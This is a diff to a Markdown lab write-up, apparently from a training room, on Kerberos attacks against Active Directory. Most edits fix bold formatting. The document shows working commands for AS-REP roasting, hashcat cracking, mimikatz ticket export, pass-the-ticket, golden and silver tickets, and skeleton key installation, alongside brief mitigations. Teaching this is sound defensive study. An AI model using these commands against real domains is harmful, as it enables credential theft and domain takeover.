@@ -1,5 +1,5 @@
 
-**This will cover the following topics
+**This will cover the following topics**
 
 - Initial enumeration using tools like Kerbrute and Rubeus
 - Kerberoasting
@@ -63,13 +63,13 @@ Rubeus.exe asreproast
 
 *This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
 
-**Insert 23$ after $krb5asrep so that the first line will be $krb5asrep$23User.....
+*Insert 23$ after $krb5asrep so that the first line will be $krb5asrep$23User.....
 
 *crack those hashes! Rubeus AS-REP Roasting uses hashcat mode 18200
 hashcat -m 18200 hash.txt Pass.txt
 
 
-**AS-REP Roasting Mitigations - 
+**AS-REP Roasting Mitigations**
 - Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective
 - Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.
 
@@ -86,7 +86,7 @@ hashcat -m 18200 hash.txt Pass.txt
 4.) `sekurlsa::tickets /export` - this will export all of the .kirbi tickets into the directory that you are currently in (preferably the administrator krbtgt ticket )
 
 
-**Now that we have our ticket ready we can now perform a pass the ticket attack to gain domain admin privileges.
+**Now that we have our ticket ready we can now perform a pass the ticket attack to gain domain admin privileges.**
 
 1.) `kerberos::ptt <ticket>` - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket.
 
@@ -95,7 +95,7 @@ List the files in the administrator share
 ``\\10.10.210.21\admin$``
 
 
-**Pass the ticket mitigation
+**Pass the ticket mitigation**
 - Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.
 
 
@@ -105,7 +105,7 @@ A silver ticket can sometimes be better used in engagements rather than a golden
 
 A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.
 
-**KRBTGT Overview
+**KRBTGT Overview**
 
 A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.
 
@@ -125,11 +125,11 @@ A golden ticket attack works by dumping the ticket-granting ticket of any user o
 ﻿create a silver ticket you need to change the /name: to dump the hash of either a domain admin
 ﻿account or a service account such as the SQLService account.
 ﻿
-﻿﻿**Create a Golden/Silver Ticket 
+﻿﻿**Create a Golden/Silver Ticket**
 ﻿﻿
 ﻿1.) `Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:` - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
 
-**Use the Golden/Silver Ticket to access other machines 
+**Use the Golden/Silver Ticket to access other machines**
 
 ﻿1.) `misc::cmd` - this will open a new elevated command prompt with the given ticket in mimikatz.
 
@@ -160,20 +160,20 @@ Kerberos::silver /user:Administrator /domain:controller.local /sid:S-1-5-21-4329
 
 *This will only be an overview section and will not require you to do anything on the machine however I encourage you to continue yourself and add other machines and test using skeleton keys with mimikatz.*
 
-**Skeleton Key Overview 
+**Skeleton Key Overview**
 
 *The skeleton key works by abusing the AS-REQ encrypted timestamps as said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.*
 
-**Preparing Mimikatz 
+**Preparing Mimikatz**
 1.) `cd Downloads && mimikatz.exe` - Navigate to the directory mimikatz is in and run mimikatz
 
 2.) `privilege::debug` - This should be a standard for running mimikatz as mimikatz needs local administrator access
 
-**Installing the Skeleton Key w/ mimikatz
+**Installing the Skeleton Key w/ mimikatz**
 1.) `misc::skeleton` - Yes! that's it but don't underestimate this small command it is very powerful
 
 
-**Accessing the forest 
+**Accessing the forest**
 
 The default credentials will be: "_mimikatz_"  
 
